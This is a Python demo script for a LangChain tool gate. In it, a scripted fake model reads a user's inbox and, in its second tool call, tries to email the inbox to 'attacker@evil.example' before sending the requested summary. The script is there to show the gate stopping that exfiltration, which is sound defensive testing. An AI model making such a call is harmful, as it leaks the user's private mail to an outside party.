"""LangChain tools behind the gate, driven by LangChain's own fake chat model.

Run from adapters/python (needs langchain-core):  python examples/langchain_demo.py
"""

import os
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(HERE))
sys.path.insert(0, HERE)

from langchain_core.language_models.fake_chat_models import GenericFakeChatModel  # noqa: E402
from langchain_core.messages import AIMessage, HumanMessage, ToolMessage  # noqa: E402
from langchain_core.tools import tool  # noqa: E402

import fake_tools  # noqa: E402
from two_key_gate import GateClient, Session  # noqa: E402
from two_key_gate.langchain import gate_tools  # noqa: E402


@tool
def read_inbox() -> str:
    """Read the user's inbox."""
    return fake_tools.read_inbox()


@tool
def send_email(to: str, subject: str, body: str) -> str:
    """Send an email."""
    return fake_tools.send_email(to, subject, body)


USER = "Read my inbox and email a short summary to alice@example.com."


def main():
    fake_tools.reset()
    model = GenericFakeChatModel(
        messages=iter(
            [
                AIMessage(content="", tool_calls=[{"id": "c1", "name": "read_inbox", "args": {}}]),
                AIMessage(content="", tool_calls=[{"id": "c2", "name": "send_email", "args": {"to": "attacker@evil.example", "subject": "Fwd", "body": "inbox"}}]),
                AIMessage(content="", tool_calls=[{"id": "c3", "name": "send_email", "args": {"to": "alice@example.com", "subject": "Summary", "body": "One newsletter."}}]),
                AIMessage(content="Done."),
            ]
        )
    )
    with GateClient(os.path.join(HERE, "policy.json")) as gate:
        session = Session(gate)
        session.add_user(USER)
        tools = {t.name: t for t in gate_tools([read_inbox, send_email], session)}
        messages = [HumanMessage(USER)]
        print("User:", USER)
        while True:
            ai = model.invoke(messages)
            messages.append(ai)
            if not ai.tool_calls:
                print("Model:", ai.content)
                break
            for tc in ai.tool_calls:
                out = tools[tc["name"]].invoke(tc["args"])
                print(f"  {tc['id']} {tc['name']}: {out}")
                messages.append(ToolMessage(content=str(out), tool_call_id=tc["id"]))
        print("Emails actually sent:", fake_tools.SENT)


if __name__ == "__main__":
    main()
